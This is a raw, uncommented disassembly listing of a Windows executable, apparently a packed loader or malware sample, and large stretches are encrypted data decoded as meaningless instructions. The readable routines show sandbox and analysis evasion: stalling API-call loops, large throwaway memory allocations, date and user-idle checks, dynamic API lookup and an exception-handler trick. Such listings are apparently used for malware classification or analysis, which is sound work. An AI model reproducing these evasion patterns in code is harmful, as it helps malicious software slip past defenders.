or eax 0x1114941e
adc [ ecx ] edx
xlat
adc [ ecx + 0x6d288181 ] eax
inc edi
stc
das
cmp eax 0xd5921111
sbb eax 0x111199f8
clc
jg r-xdata
add eax 0x122d9c11
xchg edx eax
outsb
adc eax 0xf1971e11
sbb [ ecx ] edx
adc eax edi
je r-xdata
out dx al
adc [ ecx ] edx
sub_46d904
clc
jae r-xdata
add [ ecx - 0x7e7e7e7f ] 0x3ccaf947
adc [ ecx ] edx
dec eax
xchg esp eax
rcr [ esi ] 0x1
xchg esp eax
jpo r-xdata
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx + 0x47818181 ] 0x113ccaf9
adc [ eax - 0x6c ] ecx
shl ch 0xee
out dx al
clc
adc [ ecx ] edx
stc
test [ 0xffffffffd1941111 ] dh
clc
dec ecx
adc [ ss : ecx ] edx
add [ ecx - 0x577e7e7f ] 0x11111121
jne r-xdata
adc [ ecx ] edx
adc [ ecx - 0x12 ] eax
cmc
out dx al
inc esi
dec ebp
xchg edx eax
insb
in eax dx
adc al bh
das
loop r-xdata
out dx al
add [ ecx + 0x41818181 ] 0x3935559a
stc
inc esi
and edx [ ecx ]
adc [ eax + 0x48 ] ecx
jns r-xdata
inc eax
0x4742195c 0x9446
fcomp [ esi ]
xchg ebp eax
iretd
in eax dx
or [ ecx ] dl
adc [ esi ] ebx
xchg esp eax
push ss
adc [ edx + 0x519a1d51 ] bl
sbb eax 0x119a119a
0x15980951 0x9a35
adc eax 0x81d24835
add [ ecx - 0x3f6ae17f ] 0xf8eeeef5
add [ ecx - 0x6d7e7e7f ] 0x9c11ed74
pop esp
in eax dx
inc eax
inc ecx
clc
xchg ecx eax
adc [ ecx ] edx
jpo r-xdata
xchg edx eax
je r-xdata
push eax
or [ ecx ] edx
adc eax edi
mov edx [ esi ]
adc [ ecx ] edx
add [ ecx + 0x49818181 ] 0xed549877
and dl cl
clc
sbb eax 0x81111136
sbb [ esi + edx * 2 - 0x58e1bef0 ] 0xd6904116
fist [ ecx ]
adc [ ecx ] edx
pushfd
xchg ebp eax
xor eax 0x111113b1
inc esi
clc
mov ecx 0x81eeeecf
clc
in eax 0xe1
out dx al
out dx al
push ds
cmpsb [ esi ] [ edi ]
sbb [ edi - 0x6c ] esi
fdivr st0
mov ch 0xfb
out dx al
out dx al
push ds
xchg ebp eax
ror [ ecx + edx ] cl
adc [ ecx + 0x3e ] edi
dec eax
hlt
out dx al
xor eax 0x281f839
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0x74928181
in eax dx
adc [ esp + ebx * 2 - 0x7bebf13 ] ebx
sub_46e647
out dx al
out dx al
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x26a36789 ] 0xd122d99a
ja r-xdata
pushfd
push esp
in eax 0xf8
mov ecx 0x8111110e
out dx al
add eax 0xee19549a
add esi ebp
sbb eax 0xeee2c6f8
out dx al
add [ ecx - 0x7e7e7e7f ] 0x81818181
sbb [ ecx + ebx * 2 + 0x14d17a13 ] 0xab14d87a
dec esp
cmpsd [ esi ] [ edi ]
ja r-xdata
out dx al
add al 0x11
adc [ edi - 0x68 ] esi
add eax 0x21659820
sbb eax 0x12155d7
sar al cl
movupd [ ecx ] xmm2
add [ ecx - 0x657e7e7f ] 0x1dfd92fd
jpo r-xdata
add [ ecx - 0x7e7e7e7f ] 0x599c8181
adc edi [ edx - 0x2f ]
adc al 0x7a
fcom [ ebx + ebp * 4 ]
push esp
retn
sub_46e770
inc ecx
inc edx
inc edx
jpo r-xdata
add [ ecx - 0x2e68ed7f ] 0x9c111111
pushfd
jmp 0xfffffffffa35d686
clc
xor [ eax ] dh
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x12818181
xchg edi eax
rcl [ ecx ] 0x1
adc [ ecx ] edx
pushfd
sub_46ef2f
out dx al
out dx al
out dx al
sbb eax 0xee19549a
inc ecx
jne r-xdata
jmp 0xffffffffe0db0d3e
in eax dx
and bl al
clc
mov cl 0x11
adc [ ecx ] edx
cmp eax 0xeeeefbe8
add [ ecx + 0x1112971e ] 0x4c981111
in eax dx
0x572acd54 0xf825
mov ecx 0x81111112
inc edi
clc
dec edx
std
out dx al
out dx al
add [ ecx + 0x77c69a81 ] 0x951ee794
pushfd

sub_46f2ab
out dx al
out dx al
sub [ ebp + eax - 0x8 ] ch
movsd [ edi ] [ esi ]
sti
out dx al
out dx al
or [ edx - 0x28 ] 0x107b41d2
inc edi
jpo r-xdata
fucomi st6
out dx al
add [ ecx + 0x111c00f8 ] 0x81818111
add [ ecx + 0x10ed54d6 ] 0xf8111111
jns r-xdata
jpe r-xdata
adc bh [ ecx - 0x5f ]
out dx al
out dx al
add [ ecx - 0x67882966 ] 0xf8490554
das
std
retn
scasd [ edi ]
pop edx
popfd
out dx al
cmpsb [ esi ] [ edi ]
aad 0x11
adc [ ecx ] edx
stc
mov ecx 0xf8eeeec2
imul ebx ebx 0x8181eeee
clc
add [ ecx + edx ] bl
adc [ ecx - 0x7e7e7e7f ] eax
salc
push esp
in eax dx
adc [ ecx ] dl
adc [ ecx ] edx
clc
add [ ecx - 0x79117e7f ] 0x111111f9
clc
cmc
sbb dl [ ecx ]
adc [ ecx - 0x7be7e7f ] eax
xor eax 0x81eeeee0
xor [ edi - 0x68 ] 0x7b4bfb44
ja r-xdata
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0x81818181
sub esi 0x1111f986
adc eax edi
ja r-xdata
inc esp
std
clc
adc eax 0x81eeeeec
0xd2103a13 0x8181
add [ ecx - 0x67887e7f ] 0xc79abb54
and dl cl
jpo r-xdata
cmp ecx 0xeeeedb31
xchg edx eax
aad 0x1
fcom st2
add [ ecx + 0x54288181 ] 0xd49d1ee9
int 0xee
out dx al
clc
mov ch 0xc0
out dx al
out dx al
push ds
xchg esp eax
pop esp
out dx al
out dx al
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x6be17e7f ] 0xeeeef772
sub [ ebp + ebp * 8 - 0x8 ] cl
push esp
add eax 0xfd2ff849
out dx al
add [ ecx - 0x28657e7f ] 0x1119a7f9
adc eax edi
ja r-xdata
jpo r-xdata
out dx al
out dx al
dec esi
dec edi
dec edx
fcom st2
add [ ecx - 0x7e7e7e7f ] 0x99538181
dec ebp
add al 0xb6
xchg edx eax
out dx eax
xor eax edi
salc
call 0xffffffff81c8e2cb
add [ ecx - 0x58062866 ] 0xf8111119
out dx al
out dx al
add [ ecx - 0x7e7e7e7f ] 0x25579a81
out dx al
jmp 0xfffffffff9084894
pop edi
imul esi
out dx al
add [ ecx + 0x4f4ed122 ] 0x81d2d84a
add [ ecx - 0x7e7e7e7f ] 0xf8818181
jns r-xdata
dec esp
in eax dx
clc
inc esp
mov bl 0xf8
0xf9eeeed8 0x1808
sub_46ff13
inc esp
xlat
dec ebx
jpo r-xdata
in eax 0xf8
leave
sti
out dx al
out dx al
sbb [ esi ] 0x111ded93
adc [ ecx - 0x9075aac ] ebx
adc dl [ ecx ]
adc [ ecx + 0x10b98181 ] eax
push ds
xchg ebp eax
salc
scasb [ edi ]
out dx al
out dx al
and dl cl
push ecx
clc
daa
push ss
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0xe2f98181
fsub st6
out dx al
clc
imul ebp [ esi + ebp * 8 - 0x7e7e7e12 ] 0xa1999881
adc [ ecx ] edx
ja r-xdata
adc esi ebp
int1
out dx al
xchg [ ebp + 0x42111111 ] dl
out dx al
int1
out dx al
xchg [ ecx - 0x7eeeeef ] cl
shl eax 0xee
out dx al
inc esi
cwde
push edi
dec ebp
stc
ror ecx cl
out dx al
out dx al
jns r-xdata
frstor [ ebp - 0x29 ]
inc esi
cwde
xchg edi eax
popfd
adc [ ecx ] edx
adc ecx edi
mov al [ 0x79eeeec9 ]
sahf
dec eax
dec ecx
clc
jmp 0xffffffff8235ef29
salc
adc [ esi ] edx
adc [ eax ] edx
adc esi ebp
int1
cwde
push esp
inc esp
stc
clc
cli
0x8181eeee 0x8181
sub_4702c6
adc [ edx ] esp
sar eax 0x1
lodsd [ esi ]
fsub st6
out dx al
add [ ecx - 0x7e7e7e7f ] 0x81818181
ja r-xdata
out dx al
out dx al
0xa61e1559 0xf818
push esp
sti
pushfd
xchg esp eax
lodsd [ esi ]
jmp r-xdata
add [ ecx - 0x7e7e7e7f ] 0x77818181
cwde
sub_47096b
pushfd
push esp
shl [ edx ] 0x1
fadd [ edi + 0x41 ]
ja r-xdata
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x81818181
jpo r-xdata
inc esp
div [ edi - 0x68 ]
pop esp
loope r-xdata
xor [ edi - 0x68 ] esi
pop esp
stc
dec eax
inc ebx
ja r-xdata
ja r-xdata
cwde
sbb eax 0x81eeeefc
add [ ecx + 0x1349f981 ] 0x48481111
0xf898f8d7 0xeeee
add [ ecx - 0x7e7e7e7f ] 0x86ee8181
mov ecx 0x2a111111
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx + 0x11011179 ] 0xc9549c11
pop esp
sti
0x5c9877d9 0x48fd
jpo r-xdata
cwde
push esp
inc esp
rcr [ esi ] cl
add [ ecx - 0x4679117f ] 0x2a111111
push esp
call 0x4cdfcbb4
in eax dx
out dx al
xchg ebp eax
cmp ecx esi
out dx al
out dx al
0xcca1f8d9 0xeeee
add [ ecx + 0x7be054d6 ] 0xd6117b11
push esp
in al 0x7b
adc [ ebx + 0x11 ] edi
ja r-xdata
sub dl dl
push ds
ja r-xdata
0x6c9877ef 0x22eb
out dx al
ja r-xdata
inc ecx
clc
dec ebp
retn 0xeeee
out dx al
out dx al
cmp eax 0xeeeed6bf
add [ ecx - 0x7e7e7e7f ] 0x81818181
dec ecx
ja r-xdata
inc edi
adc eax 0xeef5cff8
out dx al
cmp ecx 0xeeeeebe0
0x74920154 0x11e9
clc
mov eax [ gs : 0xffffffff9881eeee ]
push edi
or eax 0xeedffaf9
out dx al
jns r-xdata
add [ ebx ] dl
je r-xdata
push esp
leave
adc [ ecx ] eax
adc [ ecx ] edx
pushfd
ja r-xdata
push esp
in eax 0x49
adc eax edi
sbb esi edi
out dx al
out dx al
or [ edi + 0x4a ] 0xf865d492
sub al 0xad
out dx al
out dx al
cmp ah al
xchg ebp eax
retn
insb
in eax dx
dec esi
jpo r-xdata
push esp
out 0x22 eax
sar [ ebx + 0x5 ] 0x1
ja r-xdata
adc [ ecx + 0x9d59281 ] eax
pushfd
push esp
loope r-xdata
inc esp
iretd
sbb [ ebx + 0x5ef85119 ] 0x81eeeef1
add [ ecx - 0x7e7e7e7f ] 0x81818181
sbb [ esi ] 0xeed73195
out dx al
clc
clc
0x81eeeef5 0x8181
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x9877207b
clc
ja r-xdata
int 0x4b
jpo r-xdata
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx + 0x7b818181 ] 0x44987720
push esp
jmp 0xffffffffffa3a1e2
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x207b8181
push esp
mov ecx 0x7b424241
xor [ edx - 0x8 ] eax
jno r-xdata
pushfd
add [ ecx + 0x29927781 ] 0x10ddf811
dec esp
out dx eax
jpo r-xdata
out dx al
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x4195549c
inc edi
inc edi
jpo r-xdata
adc [ ecx ] edx
add [ ecx - 0x63f62a6e ] 0x9c41e154
out dx al
out dx al
add [ ecx + 0x54988181 ] 0x171af8ed
xchg edx eax
je r-xdata
cld
scasd [ edi ]
out dx al
out dx al
add [ ecx - 0x7e7e7e7f ] 0x81818181
out dx al
dec edx
ja r-xdata
in eax dx
clc
sbb dl [ edi ]
inc edi
inc edi
inc edi
clc
adc eax 0x81eeeef1
add [ ecx + 0x42818181 ] 0xd4dbf842
out dx al
out dx al
jpo r-xdata
out dx al
add [ ecx + 0x74924081 ] 0x9a4711ed
add [ ecx - 0x2f6d7e7f ] 0xfa2ef813
out dx al
loope r-xdata
adc [ edi - 0x66 ] eax
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx + 0x13d09281 ] 0xeefa2ef8
clc
fst [ eax ]
dec esp
adc [ ebx + 0x7f ] edi
clc
xchg [ esi - 0x7e7e1112 ] ch
add [ ecx - 0x7e7e7e7f ] 0xaff0f981
out dx al
out dx al
dec eax
pushfd
push ebp
xor eax 0x559c4129
xor eax 0x4646415d
jpo r-xdata
add [ ecx + 0x11798181 ] 0x9c111101
out dx al
and dl cl
push ecx
inc esi
inc esi
inc esi
inc esi
pushfd
xchg ebp eax
xor eax 0x111113ad
inc ecx
out dx al
inc edi
inc ecx
inc esi
out dx al
xchg [ ebp - 0x65eeeeef ] edi
push edx
add eax 0xeea248f8
out dx al
ja r-xdata
in eax 0xee
inc esi
clc
aas
std
out dx al
out dx al
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0xc3947781
push ds
xchg ebp eax
arpl bx si
out dx al
out dx al
push ds
cmpsb [ esi ] [ edi ]
push cs
clc
and esi edi
out dx al
out dx al
add [ edx + ebx * 4 - 0x3 ] 0x1391fd90
adc [ ecx ] edx
inc edx
clc
daa
int3
add [ ecx + 0x3ae19a47 ] 0xcf50f8e0
out dx al
out dx al
add [ ecx - 0x7e7e7e7f ] 0xee818181
push eax
iretd
scasb [ edi ]
cmpsb [ esi ] [ edi ]
out dx al
out dx al
add [ ecx - 0x34658d85 ] 0xed4c9877
dec edx
ja r-xdata
add [ ecx + 0x31951e81 ] 0xf8eeeed7
clc
push esi
cmpsb [ esi ] [ edi ]
out dx al
out dx al
add [ ecx - 0x7e7e7e7f ] 0x3ae19a47
loopne r-xdata
dec esp
mov ebp 0x4c98774a
mov edi 0x9877627b
pop esp
scasd [ edi ]
clc
add esp [ esi + ebp * 8 + 0x51d122ee ]
sub_47100c
push ebx
mov edx ecx
test edx edx
jbe r-xdata
xor eax eax
pop ebx
retn
mov ecx 0x1
mov ebx ecx
add ebx eax
mov [ ebx ] 0xc3
nop
inc ecx
dec edx
jne r-xdata
sub_471028
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call CreateMDIWindowA
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
nop
call GetLastError
cmp eax 0x578
jne r-xdata
push 0x0
push 0x0
push 0x0
call GetMenuState
mov ebx 0xa4aa0b1
nop
nop
nop
dec ebx
jne r-xdata
push 0x4
push 0x3000
push 0x1de98071
push 0x0
call VirtualAlloc
mov ebx eax
nop
nop
test ebx ebx
jne r-xdata
nop
nop
mov ecx 0x1de98071
xor edx edx
mov eax ebx
call sub_47100c
mov [ ebp - 0x4 ] eax
push 0x0
push 0x0
push 0x0
call GetMenuState
push 0x8000
push 0x0
push ebx
call VirtualFree
nop
mov ebx 0x96b4
nop
jmp r-xdata
push 0x0
push 0x0
push 0x0
call GetMenuState
dec ebx
jne r-xdata
xor eax eax
push ebp
push j_sub_403730
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
nop
nop
div eax
nop
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_471110
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4039e4#2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47113c
retn
sub_471140
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi rw-data
xor eax eax
push ebp
push j_sub_4039e4
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4712f9
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
push 0x0
push 0x0
call SelectClipRgn
call GetLastError
cmp eax 0x6
je r-xdata
nop
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_4029e4
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40c0f4
test eax eax
je r-xdata
nop
jmp r-xdata
nop
mov ebx 0x1408
nop
nop
jmp r-xdata
push 0x0
push 0x0
push 0x0
call GetMenuState
dec ebx
jne r-xdata
push 0x0
push 0x0
push 0x0
call GetMenuState
mov ebx 0x237d5
push 0x0
push 0x0
push 0x0
call GetMenuState
dec ebx
jne r-xdata
push 0x4
push 0x3000
push 0x24027607
push 0x0
call VirtualAlloc
mov ebx eax
nop
test ebx ebx
jne r-xdata
mov ecx 0x24027607
xor edx edx
mov eax ebx
call sub_47100c
push 0x0
push 0x0
push 0x0
call GetMenuState
push 0x8000
push 0x0
push ebx
call VirtualFree
nop
nop
push 0x0
push 0x0
push 0x0
call GetMenuState
nop
nop
mov ebx 0x8f47
jmp r-xdata
push 0x0
push 0x0
push 0x0
call GetMenuState
dec ebx
jne r-xdata
xor ebx ebx
xor edi edi
nop
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
nop
mov [ rw-data ] 0x0
push rw-data
call GetLocalTime
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
nop
jmp r-xdata
mov [ esi ] 0x8
nop
push esi
call GetLastInputInfo
call GetTickCount
sub eax [ esi + 0x4 ]
cmp eax 0x87
jae r-xdata
jmp r-xdata
nop
nop
cmp ebx 0x18
jle r-xdata
cmp edi [ esi + 0x4 ]
je r-xdata
push 0x0
push 0x0
push 0x0
call GetMenuState
nop
call sub_471028
push 0x0
push 0x0
push 0x0
call GetMenuState
push 0x0
push 0x0
push 0x0
call GetMenuState
nop
mov edi [ esi + 0x4 ]
nop
inc ebx
sub_471370
add [ eax ] al
add [ eax + 0x13 ] bh
inc edi
add [ esi + ebx * 2 ] bh
inc eax
add [ esi + ebx * 2 ] cl
inc eax
add [ eax ] dh
pop esp
inc eax
add ah bl
pop ebx
inc eax
add [ esi + ebx * 2 + 0x5e840040 ] dh
inc eax
add [ eax ] bl
insb
inc eax
add al ch
imul eax [ eax ] 0x50
insb
inc eax
add [ eax ] ah
insb
inc eax
add ah al
cmovno eax [ eax ]
xchg esp eax
cmovno eax [ eax ]
pushad
outsd
inc eax
add [ eax ] dh
outsd
inc eax
add [ ebx + edx * 8 - 0x2de3ffc0 ] bl
inc eax
add [ eax ] cl
fadd [ eax ]
fcomp st3
inc eax
add [ eax + 0x38004105 ] dh
add eax 0x7a40041
inc ecx
add [ edi + eax + 0x41 ] dh
add [ edi + ecx + 0xf3c0041 ] cl
inc ecx
add [ edi ] al
inc ecx
add [ esi + 0x41 ] dl
add [ eax + 0x3a ] dh
inc edx
add [ eax + 0x3a ] al
inc edx
add [ eax ] ch
cmp eax 0x3cf80042
inc edx
add ah bl
push ebp
inc edx
add [ ebp + edx * 2 + 0x45a40042 ] bl
inc edx
add [ ebp + eax * 2 + 0x42 ] dh
add [ esi + edi ] ah
inc edx
add ah dh
cmp eax 0xaa880042
inc ecx
add [ eax - 0x56 ] bl
inc ecx
add [ ecx + edi ] dh
inc edx
add [ eax + 0x38 ] ah
inc edx
add [ eax - 0x35 ] dl
inc esp
add [ eax ] ah

sub_47141e
inc esp
add ah ah
inc ebp
inc edx
add [ ebp + eax * 2 + 0x310c0042 ] dh
inc ebp
add [ eax + esi + 0x5b1c0045 ] bl
inc edx
add ah ch
pop edx
inc edx
add ah al
inc edx
add [ eax + 0x64 ] dh
inc edx
add [ eax ] ch
inc dx
add al bh
inc edx
add al dh
inc edx
add al al
inc edx
add [ eax - 0x77ffbd9b ] bh
inc edx
add [ eax + 0x50004265 ] al
inc edx
add [ eax + 0x66 ] ah
inc edx
add [ eax ] dh
inc dx
add [ esi + edi * 8 ] cl
inc edx
add ah bl
std
inc edx
add [ eax ] ah
jns r-xdata
inc edx
add al dh
js r-xdata
inc edx
add [ eax ] dl
std
inc edx
add al cl
cld
inc edx
add al ch
sti
inc edx
add [ eax + 0x400042fb ] dh
cld
inc edx
add [ eax ] dl
cld
inc edx
add ah ah
retn
inc edx
add [ eax - 0x4 ] ah
add [ eax + 0x600042fc ] ch
cld
add [ esi + edx * 2 ] dl
inc edx
add ah ah
push ebp
inc edx
add [ eax + 0x56 ] bl
inc edx
add [ esi + edx * 2 ] bl
inc edx
add [ eax + 0x68004266 ] bl
inc dx
add al dl
inc dx
add [ eax + 0x8004266 ] ah
insd
inc edx
add [ esp + ebp * 2 - 0x434fffbe ] ch
inc edx
add [ eax - 0x44 ] ch
inc edx
add [ eax + 0x65 ] cl
inc edx
add [ eax ] bl
inc edx
add [ eax ] dl
inc edx
add al ah
inc edx
sub_4714e6
inc edx
add [ eax + 0x5800437a ] cl
jpe r-xdata
inc edx
add [ eax + 0x59 ] al
inc edx
add [ eax - 0xb ] bl
inc ebp
add ah bh
hlt
add [ ebp + edi * 8 + 0x42 ] bh
add [ edi * 8 - 0x22bffbe ] ch
inc edx
add [ ebp + edi * 8 - 0x42efffbe ] al
inc edx
add al ah
mov esp 0xff8c0042
inc edx
add [ edi + edi * 8 ] dl
inc edx
add [ ebx + ecx + 0xb700043 ] dh
inc ebx
add ah dl
cdq
inc esp
add [ ecx + ebx * 4 + 0x44 ] ch
add [ eax + 0x600044af ] dl
scasd [ edi ]
inc esp
add [ edi + eax * 4 + 0x43 ] dl
add ah bl
xchg [ ebx ] al
jo r-xdata
dec eax
xor [ edi ] eax
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_45e014
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e094
call sub_403ef0
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_471370
call sub_405dc8
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45dffc
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_45e014
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e094
call sub_403ef0
sub_40114f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405720
sub_401159
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405734
ExitProcess
jmp [ ExitProcess@IAT ]
sub_40122c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
FindClose
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
FindFirstFileA
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401244
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_401254
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40125c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_40128c
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
sub_4012ac
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_4012cc
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
SysFreeString
jmp [ __import_lookup_table_3(oleaut32:SysFreeString) ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
sub_4012fc
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40130c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401330
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
sub_401348
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401350
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401358
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401360
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401368
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ab2
jmp sub_4039e4
sub_401ab9
mov al [ rw-data ]
pop ebp
retn
sub_401b96
jmp sub_4039e4
sub_401c64
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402278
retn
sub_402264
jmp sub_4039e4
sub_40240a
jmp sub_4039e4
sub_4026a9
jmp sub_4039e4
sub_40276c
call sub_405d7c
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405d7c
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027c0
mov [ rw-data ] edx
call sub_403fc8
sub_402824
push eax
push edx
push ecx
call sub_405d7c
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402818
retn
sub_402840
retn
sub_402894
retn
sub_402898
push ebx
call sub_405d7c
mov ebx [ eax + 0x4 ]
call sub_405d7c
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402a50
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402a60
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402afc
mov edx [ eax + 0x1c ]
call sub_402ab4
retn
sub_402b8f
retn
sub_402b90
xor ecx ecx
mov cl [ edx ]
inc ecx
xchg edx eax
call sub_4028b8
retn
sub_402da0
mov ecx 0xff
call sub_402dac
retn
sub_402dd0
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402dec
jmp sub_402dec
sub_402de9
retn
sub_403179
jmp sub_4039e4
sub_4031cc
fninit
fwait
fldcw [ rw-data ]
retn
sub_40321c
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_403228
push ebx
mov ebx eax
mov eax ebx
call sub_403258
call sub_4026bc
mov edx eax
mov eax ebx
call sub_40329c
pop ebx
retn
sub_403244
push ebx
mov ebx eax
mov eax ebx
call sub_4032f4
mov eax ebx
call sub_4026dc
pop ebx
retn
sub_403258
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403280
call sub_40361c
test dl dl
jle r-xdata
retn
call sub_403604
sub_403340
retn
sub_4033c8
jmp sub_4039e4
sub_4033cf
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4034d8
mov eax 0x8000ffff
retn
sub_4034e0
retn
sub_4034e4
retn
sub_4034e8
retn
sub_4035dd
jmp sub_403730
sub_4035e2
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403a44
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_403604
sub_403604
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_40360c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_40361c
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_40362c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_4036f4
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_403710
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403add
retn
sub_403c20
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403cae
jmp sub_403730
sub_403d0e
jmp sub_403730
sub_403d28
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403c20
mov [ rw-data ] 0x0
call sub_403cc8
retn
sub_403e61
retn
sub_403fc3
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403fc8
mov [ rw-data ] eax
call sub_403ef0
sub_404204
retn
sub_404240
retn
sub_40424e
retn
sub_404267
retn
sub_404278
retn
sub_40435f
retn
sub_404490
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
